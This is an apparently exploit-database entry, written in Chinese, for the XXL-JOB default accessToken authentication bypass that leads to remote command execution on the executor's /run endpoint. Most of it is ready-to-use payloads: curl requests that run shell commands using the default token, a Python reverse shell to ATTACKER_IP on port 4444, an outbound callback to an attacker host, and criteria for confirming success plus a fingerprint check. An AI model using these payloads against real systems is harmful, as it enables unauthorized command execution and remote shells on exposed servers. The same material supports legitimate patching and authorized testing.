---
id: XXL-JOB-DEFAULT-TOKEN
title: XXL-JOB 默认 accessToken 身份认证绕过漏洞
product: xxl-job
vendor: XXL-JOB
version_affected: "v2.3.1 - v2.4.0"
severity: CRITICAL
tags: [rce, auth_bypass, 无需认证]
fingerprint: ["XXL-JOB", "xxl-job", "任务调度中心"]
---

## 漏洞描述

XXL-JOB 从 v2.3.1 版本开始在配置文件中为 accessToken 设置了默认值 `default_token`。如果用户未修改此默认值，攻击者可使用该默认 Token 绕过 executor 的认证校验，通过 GLUE 模式执行任意系统命令。

## 影响版本

- XXL-JOB v2.3.1 - v2.4.0

## 前置条件

- 无需认证（使用默认 accessToken）
- executor 端口可访问（默认 9999）

## 利用步骤

1. 构造 POST 请求到 executor 的 `/run` 接口
2. 添加 `XXL-JOB-ACCESS-TOKEN: default_token` 头
3. 使用 GLUE 模式（Shell/Python）执行任意命令

## Payload

### GLUE_SHELL 执行命令

```bash
curl -s "http://target:9999/run" \
  -H "Content-Type: application/json" \
  -H "XXL-JOB-ACCESS-TOKEN: default_token" \
  -d '{
    "jobId": 1,
    "executorHandler": "demoJobHandler",
    "executorParams": "demoJobHandler",
    "executorBlockStrategy": "COVER_EARLY",
    "executorTimeout": 0,
    "logId": 1,
    "logDateTime": 1586629003729,
    "glueType": "GLUE_SHELL",
    "glueSource": "#!/bin/bash\nid",
    "glueUpdatetime": 1586699003758,
    "broadcastIndex": 0,
    "broadcastTotal": 0
  }'
```

### GLUE_PYTHON 反弹 Shell

```bash
curl -s "http://target:9999/run" \
  -H "Content-Type: application/json" \
  -H "XXL-JOB-ACCESS-TOKEN: default_token" \
  -d '{
    "jobId": 1,
    "executorHandler": "demoJobHandler",
    "executorParams": "demoJobHandler",
    "executorBlockStrategy": "COVER_EARLY",
    "executorTimeout": 0,
    "logId": 1,
    "logDateTime": 1586629003729,
    "glueType": "GLUE_PYTHON",
    "glueSource": "import os\nos.system(\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\")",
    "glueUpdatetime": 1586699003758,
    "broadcastIndex": 0,
    "broadcastTotal": 0
  }'
```

### DNS 回调验证

```bash
curl -s "http://target:9999/run" \
  -H "Content-Type: application/json" \
  -H "XXL-JOB-ACCESS-TOKEN: default_token" \
  -d '{
    "jobId": 1,
    "executorHandler": "demoJobHandler",
    "executorParams": "demoJobHandler",
    "executorBlockStrategy": "COVER_EARLY",
    "executorTimeout": 0,
    "logId": 1,
    "logDateTime": 1586629003729,
    "glueType": "GLUE_SHELL",
    "glueSource": "#!/bin/bash\ncurl http://ATTACKER_IP/xxljob_rce",
    "glueUpdatetime": 1586699003758,
    "broadcastIndex": 0,
    "broadcastTotal": 0
  }'
```

## 验证方法

默认 Token 是否生效，判据是 executor 真的受理了任务并回送成功响应，而不是「请求返回 200」。executor 的 `/run` 成功形态是 `ReturnT` 结构里 `code=200`、`msg=null`；Token 错误时 `code=500`、`msg` 为 `The access token is wrong`。

```bash
# 1. 先确认不带/带错误 Token 时的失败形态（对照组）
curl -s "http://target:9999/run" \
  -H "Content-Type: application/json" \
  -d '{"jobId":1,"executorHandler":"demoJobHandler","executorParams":"","executorBlockStrategy":"COVER_EARLY","executorTimeout":0,"logId":1,"logDateTime":1586629003729,"glueType":"GLUE_SHELL","glueSource":"#!/bin/bash\necho POC_TOKEN","glueUpdatetime":1586699003758,"broadcastIndex":0,"broadcastTotal":0}'
# 期望：code=500，msg=The access token is wrong

# 2. 带文档默认 Token 重发同一请求
curl -s "http://target:9999/run" \
  -H "Content-Type: application/json" \
  -H "XXL-JOB-ACCESS-TOKEN: default_token" \
  -d '{"jobId":1,"executorHandler":"demoJobHandler","executorParams":"","executorBlockStrategy":"COVER_EARLY","executorTimeout":0,"logId":1,"logDateTime":1586629003729,"glueType":"GLUE_SHELL","glueSource":"#!/bin/bash\necho POC_TOKEN","glueUpdatetime":1586699003758,"broadcastIndex":0,"broadcastTotal":0}'
# 期望：code=200，msg=null（任务被受理）
```

判据：同一请求带 `default_token` 后返回 `{"code":200,...,"msg":null}`，去掉该头则返回 `code:500` 加 `The access token is wrong`——两者对照才成立默认凭据被接受。任务日志里出现本次 glue 脚本的输出 `POC_TOKEN` 是更强的证据（`/log` 接口按 `logId` 取回）。

反例：接口返回 200 或任意 JSON，但 `code` 仍是 500、`msg` 仍是 token 错误 —— 只是请求到达了 executor，默认凭据不成立。登录后台口令同理，以接口返回 token/Set-Cookie 或跳转后台为准，不写「页面 200」。

## 指纹确认

```bash
curl -s "http://target:9999/" | grep -i "xxl-job\|invalid request"
```
